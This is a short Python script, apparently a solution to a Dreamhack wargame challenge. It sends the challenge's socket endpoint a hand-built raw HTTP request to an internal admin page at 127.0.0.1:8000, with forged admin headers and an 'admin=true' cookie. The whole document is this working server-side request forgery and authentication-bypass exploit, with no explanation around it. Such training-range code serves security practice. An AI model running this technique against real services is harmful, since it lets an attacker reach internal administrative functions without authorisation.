import requests

HOST="http://host3.dreamhack.games:8549/socket"

data = {"host":"", "port":0, "data":""}


host = "127.0.0.1"
port = 8000

form_data = "userid=admin"

_data = "POST /admin HTTP/1.1\r\n"
_data += "Content-Type: application/x-www-form-urlencoded\r\n"
_data += "User-Agent: Admin Browser\r\n"
_data += "DreamhackUser: admin\r\n"
_data += "Cookie: admin=true\r\n"
_data += f"Content-Length: {len(form_data)}\r\n"
_data += "\r\n"
_data += form_data


data["host"] += host
data["port"] = port
data["data"] = _data
print(data)
res = requests.post(HOST, data=data)

print(res.text)


